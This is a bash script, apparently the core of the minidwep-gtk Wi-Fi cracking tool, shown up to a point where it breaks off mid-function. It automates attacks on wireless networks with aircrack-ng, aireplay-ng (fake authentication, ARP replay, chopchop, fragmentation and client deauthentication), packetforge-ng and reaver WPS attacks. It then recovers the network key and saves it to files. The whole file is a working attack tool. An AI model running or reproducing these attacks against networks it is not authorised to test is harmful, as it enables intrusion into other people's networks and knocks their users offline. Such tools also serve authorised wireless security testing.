#!/bin/bash
# maintained by minileaf@sohu.com
# since 12 2009
me_edition="minidwep-gtk-40325"
# Name of PIPE file
declare PI=/tmp/bash.gtk.$$

# Define SIGUSR1 here and perform an exit if this
# signal occurs. Handy for debugging.
trap 'exit' 0 1 2 3 15 

# Communication function; assignment function
function gtk() { echo $1 > $PI; read GTK < $PI; }
function define() { $2 "$3"; eval $1="$GTK"; }
function exit()
{
	rm -f $path/me
	wpa_exit_do
}
function del_files()
{
	cd $path
	rm -f tmp.txt run_aircrack.txt card_mac.txt inject_rate.txt  xterm_pid.txt myarp popup_view.txt file_scan replay* target.txt clients.txt interface_sel interface fragment* air_edition tmp
	rm -f minidwep.conf interface.txt 
}
function del_wpa_files()
{
	cd $path
	rm -f tmp.txt tmp target.txt clients interface_sel interface  wep_wpa aps interface_mon stdout ch aps_clients ap_mac
	rm -f task client_mac auth minidwep.conf at_mode aircrack_on aircrack_start  injection_rate tmp1 wps_on reaver_on
	rm -f air_edition card_mac file_scan *.csv *.netxml pass scan* key tmp wep_wpa fake_auth wep_on wpa_on aps.txt
	rm -f replay* clients.txt wpa_clients tmp* wpa_start find_key  myarp *.xor term dialog tmp_yesno keyfound
	rm -f aps_abstract aps_abstract.txt clients_abstract.txt  tmp_stdout airodump_output tmp_card lap_scan lap_time
	rm -f essid_hidden aps_wep aps_wpa airodump_output* list_n* reaver.log distro tmp_abstract reaver_start
	rm -f interfaces_mons mons_on multi_no mkwpc disable_lanch disable_scan_button disable_reaver
	rm -f air_na mouse_xy air_scan seq_wpc auto_* aps_* macs_* *-pin1 first* tl
}
function wpa_exit_do()
{
	monitor_stop
	del_wpa_files
	killall aircrack-ng >/dev/null 2>&1
	killall airodump-ng >/dev/null 2>&1 
	killall reaver>/dev/null 2>&1
	killall sleep >/dev/null 2>&1
}
function now_time()
{
	echo "`date +%k:%M:%S`-->"
}
function stdout()
{
	echo "$1" >$tmp_stdout
	[ -s $stdout ]&&cat $stdout >>$tmp_stdout
	head -10 $tmp_stdout >$stdout
}
function catch_singnal()
{
t1=`date +%s`
while [ -e $path/me ]
do
	wep_on_off=`cat $path/wep_on`
	wpa_on_off=`cat $path/wpa_on`
	reaver_on_off=`cat $path/reaver_on`
	if [ "$wep_on_off" = "on" ];then
		echo "off">$path/wep_on
		echo "`now_time`Starting wep attack"
		wep_attack &
	fi
	if [ "$wpa_on_off" = "on" ];then
		echo "off">$path/wpa_on
		echo "`now_time`Starting wpa attack"
		wpa_attack &
	fi
	if [ "$reaver_on_off" = "on" ];then
		echo "off">$path/reaver_on
		echo "`now_time`Starting reaver attack"
		reaver_attack &
	fi
	if [ -e "$path/mkwpc" ];then
		mkwpc_mac=`head -1 $path/mkwpc|awk '{print$1}'`
		mkwpc_N=`head -1 $path/mkwpc|awk '{print$2}'`
		rm -f $path/mkwpc
		make_wpc $mkwpc_mac $mkwpc_N&
	fi
	if [ -e $path/auto_pin_sel ];then
		auto_pin_macs `cat $path/auto_list|awk '{print$1}'` `cat $path/auto_list|awk '{print$2}'` 
		rm -rf $path/auto_pin_sel
	fi
	aircrack_start=`cat $path/aircrack_start`
	[ -s $path/ap_mac ]&&ap_mac=`cat $path/ap_mac`
	aircrack_running=`ps -ef|grep "aircrack-ng"|grep -v grep|grep -a "$ap_mac"`
	airodump_running=`ps -ef|grep "airodump-ng"|grep -v grep|grep -a "$ap_mac"`
	if [ "$aircrack_start" = "on" -a -z "$aircrack_running" -a -n "$airodump_running" ];then
		echo "`now_time`Starting aircrak-ng"
		stdout "`now_time`$msg_45"
		run_aircrack &
	fi	
	if [ -e $path/task ];then
		if [ `cat $path/task` = "noaction" ];then
			[ -n "`ps -ef|grep aircrack-ng|grep -v grep`" ]&&killall aircrack-ng
			[ -n "`ps -ef|grep aireplay-ng|grep -v grep`" ]&&killall aireplay-ng
			[ -n "`ps -ef|grep airodump-ng|grep -v grep`" ]&&killall airodump-ng
			[ -n "`ps -ef|grep "minidwep.conf"|grep -v grep`" ]&&killall wpa_supplicant
			
		fi
	fi
	if [ -e $path/airodump ];then
		rm -f $path/airodump
		scan_start&
	fi
	
	tv=`head -1 $HOME/.tv`
	tf=`expr "$tv" : '[1-9][0-9]$'`
	[ "$tf"  = "2" ]||tv=45
	t2=`date +%s`
	if [ $t2 -gt $[$t1+$tv] ];then
		bash /usr/local/bin/minileafdwep/auto_pin &
		t1=$t2
	fi			
	sleep 1
done
}
function scan_start()
{
		if [ -e $path/interfaces_mons ];then
			interface_sel=`cat $path/interface_sel`
			interface_mon=`cat $path/interfaces_mons|grep $interface_sel|awk '{print$2}'`
			echo $interface_mon>$path/interface_mon
			interface_used=`ps -ef|grep reaver|grep $interface_mon|grep -v grep`
			interface_used1=`ps -ef|grep airodump-ng|grep $interface_mon|grep -v grep`
			if [ -n "$interface_used" -o -n "$interface_used1" ];then
				[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_77"&
				[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1"  --msgbox  "$msg_77" 10 20&
				[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1"  --msgbox  "$msg_77"&			
				echo "13">$path/task
				return
			fi
		else
			monitor=`head -1 $path/interface_mon`
			if [ -n "$monitor" ];then
				interface_used1=`ps -ef|grep airodump-ng|grep $interface_mon|grep -v grep`
				interface_used=`ps -ef|grep reaver|grep $monitor |grep -v grep`
			fi
			if [ -n "$interface_used" -o -n "$interface_used1" ];then
				[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_77"&
				[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1"  --msgbox  "$msg_77" 10 20&
				[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1"  --msgbox  "$msg_77"&			
				echo "13">$path/task
				return
			fi
			monitor_start
		fi
		[ -s $path/ch ]&&ch=`head -1 $path/ch|awk '{print$2}'`||ch=""
		echo "ch is $ch"
		monitor=`head -1 $path/interface_mon`
		rm -f $path/scan*
		echo "scan_start"
		term=`cat $path/term`
		if [ -z "$ch" ];then
		wash -i $monitor -C -o $path/wps_on&
		air_scan=`date +%s`
		echo $air_scan>$path/air_scan
		[ "$term" = "urxvt" ]&&urxvt --title "$dg_1-$air_scan" -iconic -e airodump-ng $no_one -w $path/scan $monitor &
		[ "$term" = "xterm" ]&&xterm -title "$dg_1-$air_scan" -iconic -e airodump-ng $no_one -w $path/scan $monitor &
		[ "$term" = "aterm" ]&&aterm --title "$dg_1-$air_scan" -e airodump-ng $no_one -w $path/scan $monitor &
		else
		wash -i $monitor -c $ch -C -o $path/wps_on&
		[ "$term" = "urxvt" ]&&urxvt --title "$dg_1-$air_scan" -iconic -e airodump-ng $no_one -c $ch -w $path/scan $monitor &
		[ "$term" = "xterm" ]&&xterm -title "$dg_1-$air_scan" -iconic -e airodump-ng $no_one -c $ch -w $path/scan $monitor &
		[ "$term" = "aterm" ]&&aterm --title "$dg_1-$air_scan" -e airodump-ng $no_one -c $ch -w $path/scan $monitor &
		fi
		echo "airodump-ng and wash is undergoing"
}
function scan_stop()
{
		echo "path is $path"
		wep_wpa=`head -1 $path/wep_wpa`
		echo "wep_wpa is $wep_wpa"
		ch=$(head -1 $path/ch)
		if [ -n "`ps --help 2>&1|grep BusyBox|grep -v grep`" ];then
			kill `ps -ef|grep airodump-ng|grep $air_scan|awk '{print$1}'`
		else
			kill `ps -ef|grep airodump-ng|grep $air_scan|awk '{print$2}'`
		fi
		rm -f $path/air_scan
		killall wash
		aircrack_edition=`aircrack-ng --help|grep "Aircrack-ng 1.0"|awk '{print $3}'`
		aircrack_edition0=`aircrack-ng --help|grep "Aircrack-ng 0"`
		[ -z "$aircrack_edition0" -a -z "$aircrack_edition" ]&&aircrack_edition="-"
		[ -n "$aircrack_edition0" ]&&aircrack_edition="rc1"
		echo $aircrack_edition >$path/air_edition
		scan="$path/scan-01.txt"
		echo "$path/scan-01.txt" > $path/file_scan
		if [ "$aircrack_edition" != "rc1" -a "$aircrack_edition" != "rc2" -a -n "$aircrack_edition" ];then
				echo "now turn file_scan to scan-01.csv " 
				scan="$path/scan-01.csv"
				echo "$path/scan-01.csv" >$path/file_scan
		fi 
		echo "aircrack-ng is $aircrack_edition"
		if [ -e "$scan" ]; then
			cutline=`cat $scan | grep -a -n Station |awk -F : '{print $1}'`
			head -n $[$cutline-2] $scan|tail -n +3|awk -F, '{print $1 $4 $5 $6 $9 $14}' >$path/aps
			cat $path/aps|awk '{if($5!="OPN")print}'>$path/tmp
			cat $path/aps|awk '{if($5=="OPN"){$5="";print}}'>>$path/tmp
			cat $path/tmp>$path/aps
			cat aps|grep -a "WPA">$path/aps_wpa
			cat aps|grep -a "WEP" >$path/aps_wep
			echo "">$path/aps_clients
			rm -rf $path/aps_wps
			ii=1
			for ea in $path/aps_wep $path/aps_wpa
			do
				airodump_output_na="airodump_output""$ii"
			if [ -z "`cat $ea`" ];then
				[ "$ea" = "$path/aps_wep" ]&&echo "NO ap with WEP found"||echo "NO ap with WPA found"
				if [ "$ea" = "$path/aps_wep" ];then
					[ "$lang" = "zh" ]&&msg_56="No ap found没有在信道$ch发现WEP加密的无线路由"||msg_56="No ap with WEP found on channel $ch"
				else
					[ "$lang" = "zh" ]&&msg_56="No ap found没有在信道$ch发现WPA加密的无线路由"||msg_56="No ap with WPA found on channel $ch"
				fi				
				echo "$msg_56">$path/$airodump_output_na
			else
				scanlines=$(wc -l $scan |awk '{print$1}')
				tail  $scan -n $[$scanlines - $cutline]|grep -v '^$'|grep -v "not assoiated" |awk -F, '{print $1 $6 $7}'>$path/clients
				#sed -i -e /"BSSID Privacy Cipher"/,/"Station MAC BSSID Probed ESSID"/d -e /"not associated"/d $path/clients
				error_line=`grep -a -n Station $path/clients|awk -F : '{print $1}'`
				[ -n "$error_line" ]&&sed -i 1,"$error_line"d $path/clients
				echo ${aplist_n[@]}
				echo ${apmac_n[@]}
				echo ${apname_n[@]}
				echo ${appwr_n[@]}
				echo ${apchannel_n[@]}
				echo ${apprivacy_n[@]}	
				echo ${apclientmac_n[@]}
				rm -f $path/$airodump_output_na
				cat $ea|tr \| .|tr '*' .|tr '`' .|tr \' .|tr \{ .|tr \} .|tr \( .|tr \) .|tr \[ .|tr \] .|tr \& .>$tmp2
				i=0	
				while read  LINE
				do
				    	aplist_n[$i]=${LINE}
					#$1 apmac $6 apname $5 appwr $2 apchannel $4 apprivacy
					p6=$(echo "$LINE"|awk '{print $6}')
					p7=$(echo "$LINE"|awk '{print $7}')
					p8=$(echo "$LINE"|awk '{print $8}')
					p9=$(echo "$LINE"|awk '{print $9}')
					if [ -n "$p6" -a -z "$p7" ];then
						apname_n[$i]=$p6"__"
					elif [ -n "$p7" -a -z "$p8" ];then
						apname_n[$i]=$p6"_"$p7
					elif [ -n "$p8" -a -z "$p9" ];then
						apname_n[$i]=$p6"_"$p7"_"$p8
					elif [ -n "$p9" ];then
						apname_n[$i]=$p6"_"$p7"_"$p8"_"$p9
					else
						apname_n[$i]="hidden"
					fi
					apmac_n[$i]=$(echo "$LINE"|awk '{print $1}')
					appwr_n[$i]=$(echo "$LINE"|awk '{print $5}')
					apchannel_n[$i]=$(echo "$LINE"|awk '{print $2}')
					apprivacy_n[$i]=$(echo "$LINE"|awk '{print $4}')
					[ -z "${apprivacy_n[$i]}" ]&&apprivacy_n[$i]="unknown"
					cat $path/clients|grep -a "${apmac_n[$i]}"|awk '$1 != "${apmac_n[$i]}" {print $1}'>$tmp
					apclientmac_n[$i]=$(head -1 $tmp)
					wps_on=""
					wps_on=`cat $path/wps_on|grep ${apmac_n[$i]}|awk '{print $1}'`
					[ -n "$wps_on" ]&&wps_on="wps"
					echo "-----------------------------------------------------------------------------"
					echo -e 'ap mac is '${apmac_n[$i]}'  '${apname_n[$i]}' '${appwr_n[$i]}' '${apchannel_n[$i]}' '${apprivacy_n[$i]}'\nclient mac:'${apclientmac_n[$i]}' '$wps_on
					echo "-----------------------------------------------------------------------------"
					echo "${apmac_n[$i]}__${apname_n[$i]}__${appwr_n[$i]}___${apchannel_n[$i]}___${apprivacy_n[$i]}__${apclientmac_n[$i]}_$wps_on" >>$path/$airodump_output_na
					if [ "$wps_on" = "wps" ];then
						echo "${apmac_n[$i]}__${apname_n[$i]}__${appwr_n[$i]}___${apchannel_n[$i]}___${apprivacy_n[$i]}__${apclientmac_n[$i]}_$wps_on" >>$path/aps_wps
					fi
					echo "${apmac_n[$i]} essid-${apname_n[$i]} pwr-${appwr_n[$i]} ch-${apchannel_n[$i]} enc-${apprivacy_n[$i]} client-${apclientmac_n[$i]}">>$path/aps_clients
					i=$[$i+1]
				done < $tmp2
			fi
				if [ "$wep_wpa" = "WEP" ];then
					airodump_output_na="airodump_output1"
					cat $airodump_output_na >$path/airodump_output
				else
					airodump_output_na="airodump_output2"
					cat $airodump_output_na >$path/airodump_output
				fi
				ii=$[$ii+1]
			done
			[ -e $path/aps.txt ]&&cat aps >>$path/aps.txt||cat aps>$path/aps.txt
			cat $path/aps.txt|awk '!a[$1]++'>$path/tmp 
			cat $path/tmp >$path/aps.txt		
		fi
		echo "Scanning is over!"
}
function monitor_stop()
{
if [ -s $path/interface_mon ];then
		while read line
		do 
			[ -n "${line}" ]&&airmon-ng stop ${line} 
		done < $path/interface_mon
		echo "stop monitor inteface"
		[ -n "`ps -ef|grep "minidwep.conf"|grep -v grep`" ]&&killall wpa_supplicant

fi
}
function monitor_start()
{
		#monitor interface detection
		monitor_stop
		lang=$LANG
		export LANG=en
		airmon-ng >$tmp
		interface_amount_normal=`wc -l $tmp|awk '{print $1}'`
		echo "interface_amount_normal is $interface_amount_normal"
		interface=`airmon-ng |grep iwlagn|grep -v 'mon\w*'|awk '{print $1}'`
		if [ -n "$interface" ];then
			ifconfig $interface down
				modprobe -r iwlagn
				modprobe iwlagn
		fi		
		interface=`head -1 $path/interface_sel`
		ifconfig $interface up
		ch=`head -1 $path/ch|awk '{print$2}'`
		airmon-ng start $interface $ch
		#airmon-ng |grep -v 'Interface' |grep -v '^$' |awk '{print$1}' >$path/interface
		#monitor=$(tail -1 $path/interface)
		airmon-ng >$tmp1
		export LANG=$lang
		monitor=$(diff $tmp1 $tmp|tail -1|awk '{print$2}')
		interface_amount_mon=`wc -l $tmp1|awk '{print $1}'`
		echo "interface_amount_mon is $interface_amount_mon"
		if [ "$interface_amount_normal" = "$interface_amount_mon" ];then
			monitor=$interface
		fi
		echo $monitor >$path/interface_mon
		cat /sys/class/net/$interface/address>$path/card_mac
		card_mac=`tail -1 $path/card_mac|cut -c1-17|tr "a-z" "A-Z"`
		echo $card_mac>$path/card_mac
		card_mac=`head -1 $path/card_mac`
		echo "Monitor mode on interface :"$monitor
		echo "Wireless card MAC is "$card_mac
}
function aireplay3_deauth()
{
	sleep 10
	ap_mac=`cat $path/ap_mac`
	card_mac=`cat $path/card_mac`
	aireplay3=`ps -ef|grep "aireplay-ng -3 -b $ap_mac"|grep -v grep`
	[ -z "$aireplay3" ]&&return
	[ -s "$tmp_3" ]&&stdout "`now_time`$msg_46"	
	monitor=`cat $path/interface_mon`
	while [ -s "$tmp_3" ]
	do 
		client_mac=`cat $path/client_mac`
		if [ -z "$client_mac" -o "$client_mac" = "$card_mac" ];then
			stdout "`now_time`$msg_47"
			sleep 10
			abstract_info_aps "WEP" $ap_mac
			client_mac=`cat $path/client_mac`
		else
			echo "$client_mac">$path/wpa_clients
		fi
		if [ -n "$client_mac" ];then
			stdout "`now_time`$msg_58"
			sleep 60
			while [ -e "$tmp_3" ]
			do
				while read line
				do
					if [ -n "${line}" -a "$card_mac" != "$client_mac" ];then
						if [ -e "$tmp_3" ];then
							client_mac=${line}
							stdout "`now_time`$msg_48"
							aireplay-ng -0 3 -a $ap_mac -c $client_mac $monitor $no_one 
							stdout "`now_time`$msg_49"
						else
							break
						fi
					fi
					[ -e "$tmp_3" ]||break
					sleep 90
				done < $path/wpa_clients
			done
		fi
	done

}
function aireplay4()
{
#ap_mac card_mac  monitor injection_rate client_mac
	if [ -z "$5" ];then
		c_mac=$2
	else
		c_mac=$5
	fi
	stdout "`now_time`$msg_24"
	echo "aireplay-ng -F -m 68 -n 512 -4 -b $1 -h $c_mac $3"
	rm -f replay_dec*
	(aireplay-ng -F -m 68 -n 512 -4 -b $1 -h $c_mac $3 $no_one)
	xor=`ls replay_dec*.xor`
	if [ -z $xor ];then
		stdout "`now_time`$msg_25"
		echo "aireplay-ng -4 failed"
		return
	else
		packetforge-ng -0 -a $1 -h $c_mac -k 255.255.255.255 -l 255.255.255.255 -y $xor -w myarp 
		echo "Chopchop is successful,running aireplay-ng -2"
		stdout "`now_time`$msg_26"	
		aireplay-ng -F -2 -r myarp -h $c_mac -x $injection_rate $3 $no_one&
		echo "aireplay-ng -F -x $4 -2 -r myarp -h $c_mac $3"	
	fi
}
function aireplay5()
{
#ap_mac card_mac  monitor injection_rate client_mac
	if [ -z "$5" ];then
		c_mac=$2
	else
		c_mac=$5
	fi
	stdout "`now_time`$msg_27"
	rm -f fragment* 
	echo "aireplay-ng -F -m 144 -5 -b $1  -h $c_mac $3"
	(aireplay-ng -F -m 144 -5 -b $1 -h $c_mac $3 $no_one) 
	xor=`ls fragment*.xor| grep fragment`
	if [ -z $xor ];then
		stdout "`now_time`$msg_28"
		echo "aireplay-ng -5 failed"
		return
	else
		packetforge-ng -0 -a $1 -h $c_mac -k 255.255.255.255 -l 255.255.255.255 -y $xor -w myarp 
		echo "Fragment paketforge-ng is OK,running aireplay-ng -2"
		stdout "`now_time`$msg_29"	
		aireplay-ng -F -2 -r myarp -h $c_mac -x $4 $3 $no_one&
		echo "aireplay-ng -F -x $4 -2 -r myarp -h $c_mac $monitor"			
	fi
}
function wep_attack()
{
cat $path/at_mode
ap_mac=$(cat $path/ap_mac)
cat $path/aps_clients|grep -a "$ap_mac"|awk '{print$6}'>$tmp
cat $tmp|awk -F - '{print $2}'>$path/client_mac
client_mac=$(head -1 $path/client_mac)
echo "client_mac is $client_mac"
cat $path/aps_clients|grep -a "$ap_mac"|awk '{print$4}'>$tmp
cat $tmp|awk -F - '{print "channel "$2}'>$path/ch
ch=$(head -1 $path/ch|awk '{print$2}')
monitor=`head -1 $path/interface_mon`
echo "ch is $ch"
monitor_start
injection_rate=`head -1 $path/injection_rate`
killall airodump-ng >/dev/null 2>&1
rm -f $path/scan* 
echo "`now_time`delete $path/scan*"
sleep 1
echo "`now_time`urxvt -iconic -e airodump-ng $no_one -w $path/scan -c $ch --bssid $ap_mac $monitor"
[ "$ch" = "108" ]&&ch="1"
[ "$ch" = "113" ]&&ch="2"
[ "$ch" = "118" ]&&ch="3"
[ "$ch" = "123" ]&&ch="4"
[ "$ch" = "128" ]&&ch="5"
[ "$ch" = "133" ]&&ch="6"
[ "$ch" = "138" ]&&ch="7"
[ "$ch" = "143" ]&&ch="8"
[ "$ch" = "148" ]&&ch="9"
[ "$ch" = "153" ]&&ch="10"
[ "$ch" = "158" ]&&ch="11"
[ "$ch" = "163" ]&&ch="12"
[ "$ch" = "168" ]&&ch="13"
[ "$ch" = "173" ]&&ch="14"
if [ "$ch" = "1" -o "$ch" = "2" -o "$ch" = "3" -o "$ch" = "4" -o "$ch" = "5" -o "$ch" = "6" -o "$ch" = "7" -o "$ch" = "8" -o "$ch" = "9" -o "$ch" = "10" -o "$ch" = "11" -o "$ch" = "12" -o "$ch" = "13" -o "$ch" = "14" ]
then
	air=`date +%s`
	[ -n "`cat $path/term|grep "urxvt"`" ]&&urxvt --title "$dg_1-$air" -iconic -e airodump-ng $no_one -w $path/scan -c $ch --bssid $ap_mac $monitor &
	[ -n "`cat $path/term|grep "xterm"`" ]&&xterm -title "$dg_1-$air" -iconic -e airodump-ng $no_one -w $path/scan -c $ch --bssid $ap_mac $monitor &
	[ -n "`cat $path/term|grep "aterm"`" ]&&aterm --title "$dg_1-$air" -e airodump-ng $no_one -w $path/scan -c $ch --bssid $ap_mac $monitor &
	echo "$dg_1-$air">$path/air_na
else
	echo "channel number is not valid"
	stdout "`now_time`$msg_63"
	return
fi
		interface=`cat $path/interface_sel`
		lang=$LANG
		export LANG=en
		interface2=`airmon-ng |grep iwlagn|grep -v 'mon\w*'|awk '{print $1}'`
		export LANG=$lang
		if [ "$interface" = "$interface2" ];then
			intel="iwlagn"
		else
			intel=""
		fi
		intel5300=`lspci -vv|grep "5300 AGN"`
		intel5100=`lspci -vv|grep "5100 AGN"`
		if [ -n "$intel" ];then
  			if [ -n "$intel5300" -o -n "$intel5100" ];then  
	  			echo "$intel"
	  			card_mac=`cat $path/card_mac`
				echo "">$path/client_mac
				client_mac=`head -1 $path/client_mac`
  			fi
		fi

if [ -z $client_mac ];then
	stdout "`now_time`$msg_18"
	echo "`now_time`aireplay-ng -1 86400 -q 60 -a $ap_mac $monitor $no_one>$path/fake_auth"
	p6=`cat $path/aps|grep -a "$ap_mac"|awk '{print $6}'`
	p7=`cat $path/aps|grep -a "$ap_mac"|awk '{print $7}'`
	p8=`cat $path/aps|grep -a "$ap_mac"|awk '{print $8}'`
	p9=`cat $path/aps|grep -a "$ap_mac"|awk '{print $9}'`
	[ -n "$p6" ]&&ap_name=$p6
	[ -n "$p7" ]&&ap_name=$p6"_"$p7
	[ -n "$p8" ]&&ap_name=$p6"_"$p7"_"$p8
	[ -n "$p9" ]&&ap_name=$p6"_"$p7"_"$p8"_"$p9
	essid_chinese=`echo "$ap_name"|tr -d "\n"|od -An -t dC|grep -`
	aireplay-ng -1 86400 -q 60 -a $ap_mac $monitor $no_one>$path/fake_auth &
	sleep 1
	asso=`cat $path/fake_auth |grep -a "Association successful"`
	airodump_on=`ps -ef|grep "airodump-ng"|grep -v grep`
	aireplay1_on=`ps -ef|grep "aireplay-ng -1 86400"|grep -v grep`
	while [ -z "$asso" -a -n "$airodump_on" ]
	do
		echo "Sending Authentication Request"
		sleep 1
		asso=`cat $path/fake_auth|grep -a "Association successful"`
		asso_no=`cat $path/fake_auth|grep -a "Attack was unsuccessful"`
		asso_nobssid=`cat $path/fake_auth|grep -a "No such BSSID available"`
		asso_ch_diff=`cat $path/fake_auth|grep -a "but the AP uses channel"`
		asso_essid=`cat $path/fake_auth|grep -a "Please specify an ESSID"`
		asso_terminated=`cat $path/fake_auth|grep -a "Terminated"`
		airodump_on=`ps -ef|grep "airodump-ng"|grep -v grep`
		if [ -n "$essid_chinese" -a -n "$asso_essid" -a "$interface" != "$monitor" ];then 
			[ -n "`ps -ef|grep "minidwep.conf"|grep -v grep`" ]&&killall wpa_supplicant
			echo "network={">$path/minidwep.conf
			echo "	bssid=$ap_mac">>$path/minidwep.conf		
			echo "	key_mgmt=NONE">>$path/minidwep.conf		
			echo "	wep_key0=\"fakekey\"">>$path/minidwep.conf	
			echo "}">>$path/minidwep.conf
			stdout "`now_time`$msg_59"
			wpa_supplicant -i$interface -c $path/minidwep.conf 2>/dev/null &
			sleep 25
			abstract_info_fake_auth $ap_mac
		else
			if [ -n "$asso_no" -o -n "$asso_nobssid" -o -n "$asso_ch_diff" -o -n "$asso_essid" ];then
				stdout "`now_time`$msg_19"
				echo "Fake Authentication unsuccessful!"
				if [ -n "$asso_essid" ];then
					#stdout "`now_time`$msg_34"
					echo "Essid hidden! "
					essid_hidden_run
				fi
				break
			fi
		fi
	done
	asso=`cat $path/fake_auth|grep -a "Association successful"`
	if [ -n "$asso" ];then
		echo "Fake Authentication successful!"
		stdout "`now_time`$msg_20"
		if [ -z "$essid_chinese" ];then 
			interface=`cat $path/interface_sel`
			lang=$LANG
			export LANG=en
			interface2=`airmon-ng |grep iwlagn|grep -v 'mon\w*'|awk '{print $1}'`
			export LANG=$lang
			if [ "$interface" = "$interface2" ];then
				intel="iwlagn"
			else
				intel=""
			fi
			intel5300=`lspci -vv|grep "5300 AGN"`
			intel5100=`lspci -vv|grep "5100 AGN"`
			if [ -n "$intel" ];then
  				if [ -n "$intel5300" -o -n "$intel5100" ];then  
					[ -n "`ps -ef|grep "minidwep.conf"|grep -v grep`" ]&&killall wpa_supplicant
	  				echo "network={">$path/minidwep.conf
	  				echo "	bssid=$ap_mac">>$path/minidwep.conf		
		  			echo "	key_mgmt=NONE">>$path/minidwep.conf		
		  			echo "	wep_key0=\"fakekey\"">>$path/minidwep.conf	
	  				echo "}">>$path/minidwep.conf
					wpa_supplicant -i$interface -c $path/minidwep.conf 2>/dev/null &
	  				echo "$intel"
		  			card_mac=`cat $path/card_mac`
  				fi
			fi
		fi
	else
		stdout "`now_time`$msg_21" 
		echo "Fake Authentication unsuccessful,capturing packets and waiting for a client"
		client_mac=`head -1 $path/client_mac`
		noaction=`cat $path/task`
		while [ -z "$client_mac" -a -e $path/me -a "$noaction" != "noaction" ]
		do
			sleep 20
			wait_for_client_on $ap_mac
			client_mac=`head -1 $path/client_mac`
			noaction=`cat $path/task`
		done
	fi
fi

unset modea_n
i=0
while read line
do
	modea_n[$i]=${line}
	i=$[$i+1]	
done <$path/at_mode

i_max=${#modea_n[@]}
for (( i=0; i < i_max; i++ )); do
if [ "${modea_n[$i]}" = "2" ];then
	if [ -z $client_mac ];then
		client_mac=$card_mac
	fi
	echo "aireplay-ng -F -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b $ap_mac -h $client_mac -x $injection_rate $monitor"
	stdout "`now_time`$msg_22"
	(aireplay-ng -F -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b $ap_mac -h $client_mac -x $injection_rate $monitor $no_one|tee $tmp_2 &)
fi
if [ "${modea_n[$i]}" = "3" ];then
	if [ -z $client_mac ];then
		client_mac=$card_mac
	fi
	stdout "`now_time`$msg_23"
	echo "aireplay-ng -3 -b $ap_mac -h $client_mac -x $injection_rate $monitor"
	(aireplay-ng -3 -b $ap_mac -h $client_mac -x $injection_rate $monitor $no_one|tee $tmp_3 &)
	[ "`cat $path/at_mode`" = "3" ]&&aireplay3_deauth &
fi
if [ "${modea_n[$i]}" = "4" ];then
	(aireplay4 $ap_mac $card_mac  $monitor $injection_rate $client_mac &)
fi
if [ "${modea_n[$i]}" = "5" ];then
	(aireplay5 $ap_mac $card_mac  $monitor $injection_rate $client_mac &)
fi
if [ "${modea_n[$i]}" = "6" ];then
	if [ -z $client_mac ];then
		client_mac=$card_mac
	fi
	stdout "`now_time`$msg_30"
	echo "aireplay-ng -6 -b $ap_mac -x $injection_rate $monitor"
	(aireplay-ng -6 -b $ap_mac -h $client_mac -x $injection_rate $monitor $no_one|tee $path/tmp_6 &)
fi
if [ "${modea_n[$i]}" = "7" ];then
	if [ -z $client_mac ];then
		client_mac=$card_mac
	fi
	stdout "`now_time`$msg_31"
	echo "aireplay-ng -7 -F -b $ap_mac -x $injection_rate $monitor"
	(aireplay-ng -7 -F -b $ap_mac -h $client_mac -x $injection_rate $monitor $no_one|tee $path/tmp_7 &)
fi
done
}
function run_aircrack()
{
echo "starting aircrack-ng"
ap_mac=`cat $path/ap_mac`
rm -f $path/keyfound
if [ -s $path/scan-01.cap ];then
	#air_edition=`cat $path/air_edition`
	#if [ $air_edition = "-" -o $air_edition = "rc4" -o $air_edition = "rc3" ];then
	#	aircrack-ng -b $ap_mac -l $path/keyfound $path/scan-01.cap 
	#else
		(aircrack-ng -b $ap_mac $path/scan-01.cap |tee $path/find_key)
		(cat $path/find_key |grep "KEY FOUND"|awk '{print$4" "$7}'>$tmp)
		head -1 $tmp >$path/keyfound
	#fi
	if [ -s $path/keyfound ];then
		rm -f $path/scan*
		key=`cat $path/keyfound|awk '{print$1}'`
		as=`cat $path/keyfound|awk '{print$2}'`
		echo "key found : $key"
		echo "ascii :$as"
		strs=`echo $key|tr : " "`
		he=""
		for i in $strs	
		do
			he=$he"$i"
		done
		keyfile=""$ap_mac"_key"
		keyfile=`echo $keyfile|tr : -`
		p6=`cat $path/aps|grep -a "$ap_mac"|awk '{print $6}'`
		p7=`cat $path/aps|grep -a "$ap_mac"|awk '{print $7}'`
		p8=`cat $path/aps|grep -a "$ap_mac"|awk '{print $8}'`
		p9=`cat $path/aps|grep -a "$ap_mac"|awk '{print $9}'`
		[ -n "$p6" ]&&ap_name=$p6
		[ -n "$p7" ]&&ap_name=$p6"_"$p7
		[ -n "$p8" ]&&ap_name=$p6"_"$p7"_"$p8
		[ -n "$p9" ]&&ap_name=$p6"_"$p7"_"$p8"_"$p9
		if [ -z "$ap_name" ];then
			ap_name=`cat $path/essid_hidden|grep -a "$ap_mac"|awk '{print $2}'`
		fi
		echo "AP MAC: $ap_mac ">$path/$keyfile
		essid_chinese=`echo "$ap_name"|tr -d "\n"|od -An -t dC|grep -`
		if [ -z "$essid_chinese" -a -n "$ap_name" ];then 
			echo "Essid: $ap_name">>$path/$keyfile 
		fi
		echo "Hex key:  $he">>$path/$keyfile
		[ -n "$as" ]&&echo "ASCII key: $as">>$path/$keyfile
		cp -f $path/$keyfile /tmp
		echo "Essid: $ap_name">>/tmp/$keyfile
		echo "Key is in file /tmp/$keyfile">>$path/$keyfile
		[ "$lang" = "zh" ]&&msg_32="找到[$ap_mac]密码: $he"||msg_32="key of [$ap_mac] found: $he"
		cp -rf $path/$keyfile $path/pass
		stdout "`now_time`$msg_32"
		air_na=`cat $path/air_na`
		if [ -n "`ps --help 2>&1|grep BusyBox|grep -v grep`" ];then
			kill `ps -ef|grep airodump-ng|grep $air_na|awk '{print$1}'`
		else
			kill `ps -ef|grep airodump-ng|grep $air_na|awk '{print$2}'`
		fi

		#monitor_stop
		rm -f $path/air_na
		[ -n "`cat $path/dialog|grep "Xdialog"`" ]&&Xdialog --title "$dg_1" --no-cancel --textbox "$path/$keyfile" 12 50
		[ -n "`cat $path/dialog|grep "zenity"`" ]&&zenity --text-info --title="$dg_1" --filename="$path/$keyfile"
